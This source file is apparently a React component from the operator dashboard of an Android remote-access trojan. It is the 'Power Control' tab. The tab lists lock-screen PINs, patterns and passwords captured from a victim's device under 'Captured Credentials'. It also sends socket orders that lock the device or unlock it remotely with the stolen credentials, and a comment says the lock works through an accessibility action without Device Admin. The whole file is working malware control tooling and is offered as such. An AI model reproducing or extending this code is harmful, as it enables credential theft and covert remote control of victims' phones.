import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Lock, Unlock, Key, Grid3x3 } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

export function PowerTab({ clientId }: { clientId: string }) {
  const lockCreds = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.lockCreds ?? [],
  )
  
  const [pin, setPin] = useState('')
  const [pattern, setPattern] = useState('')
  
  const latestPin = lockCreds[0]?.pin || ''
  const latestPattern = lockCreds[0]?.pattern || ''
  
  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center gap-2">
        <Lock className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">Power Control</h3>
      </div>
      
      {/* */}
      <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-4 space-y-3">
        <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-zinc-500">
          <Lock className="h-3.5 w-3.5 text-emerald-400/80" />
          Lock Screen
        </div>
        <Button
          onClick={() => emitOrder(clientId, 'lock_screen')}
          className="w-full bg-rose-500/15 text-rose-300 ring-1 ring-rose-500/30 hover:bg-rose-500 hover:text-white"
        >
          <Lock className="h-4 w-4" /> Lock Device Now
        </Button>
        <p className="text-[10px] text-zinc-600">
          Works via GLOBAL_ACTION_LOCK_SCREEN (Android 9+). No Device Admin needed.
        </p>
      </div>
      
      {/*ـ PIN */}
      <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-4 space-y-3">
        <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-zinc-500">
          <Key className="h-3.5 w-3.5 text-emerald-400/80" />
          Unlock with PIN
        </div>
        
        {latestPin && (
          <div className="rounded bg-emerald-500/10 px-3 py-2 text-xs">
            <span className="text-zinc-500">Stored PIN: </span>
            <span className="font-mono text-emerald-300">{latestPin}</span>
          </div>
        )}
        
        <Input
          type="text"
          placeholder="Enter PIN"
          value={pin}
          onChange={(e) => setPin(e.target.value)}
          className="bg-black/40 border-white/10 font-mono text-sm"
        />
        
        <div className="flex gap-2">
          <Button
            onClick={() => emitOrder(clientId, 'unlock_screen', { pin })}
            disabled={!pin}
            className="flex-1 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
          >
            <Unlock className="h-4 w-4" /> Unlock
          </Button>
          
          {latestPin && (
            <Button
              onClick={() => emitOrder(clientId, 'unlock_screen', { pin: latestPin })}
              className="flex-1 bg-blue-500/15 text-blue-300 ring-1 ring-blue-500/30 hover:bg-blue-500 hover:text-white"
            >
              <Unlock className="h-4 w-4" /> Use Stored
            </Button>
          )}
        </div>
      </div>
      
      {/* */}
      <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-4 space-y-3">
        <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-zinc-500">
          <Grid3x3 className="h-3.5 w-3.5 text-emerald-400/80" />
          Unlock with Pattern
        </div>
        
        {latestPattern && (
          <div className="rounded bg-emerald-500/10 px-3 py-2 text-xs">
            <span className="text-zinc-500">Stored Pattern: </span>
            <span className="font-mono text-emerald-300">{latestPattern}</span>
          </div>
        )}
        
        <Input
          type="text"
          placeholder="e.g. 1,2,3,4"
          value={pattern}
          onChange={(e) => setPattern(e.target.value)}
          className="bg-black/40 border-white/10 font-mono text-sm"
        />
        
        <div className="flex gap-2">
          <Button
            onClick={() => emitOrder(clientId, 'unlock_pattern', { pattern })}
            disabled={!pattern}
            className="flex-1 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
          >
            <Unlock className="h-4 w-4" /> Unlock
          </Button>
          
          {latestPattern && (
            <Button
              onClick={() => emitOrder(clientId, 'unlock_pattern', { pattern: latestPattern })}
              className="flex-1 bg-blue-500/15 text-blue-300 ring-1 ring-blue-500/30 hover:bg-blue-500 hover:text-white"
            >
              <Unlock className="h-4 w-4" /> Use Stored
            </Button>
          )}
        </div>
      </div>
      
      {/* */}
      <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-4">
        <div className="text-xs uppercase tracking-wider text-zinc-500 mb-2">
          Captured Credentials
        </div>
        <div className="max-h-40 overflow-y-auto space-y-1">
          {lockCreds.length === 0 ? (
            <div className="text-xs text-zinc-600 py-4 text-center">
              No credentials captured yet
            </div>
          ) : (
            lockCreds.map((c, i) => (
              <div
                key={i}
                className="flex items-center gap-2 px-2 py-1 text-xs rounded hover:bg-white/[0.03]"
              >
                <span className="text-zinc-500">{c.capturedAt}</span>
                {c.pin && (
                  <span className="font-mono text-emerald-300">
                    PIN: {c.pin}
                  </span>
                )}
                {c.pattern && (
                  <span className="font-mono text-blue-300">
                    Pattern: {c.pattern}
                  </span>
                )}
                {c.password && (
                  <span className="font-mono text-yellow-300">
                    Pass: {c.password}
                  </span>
                )}
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  )
}
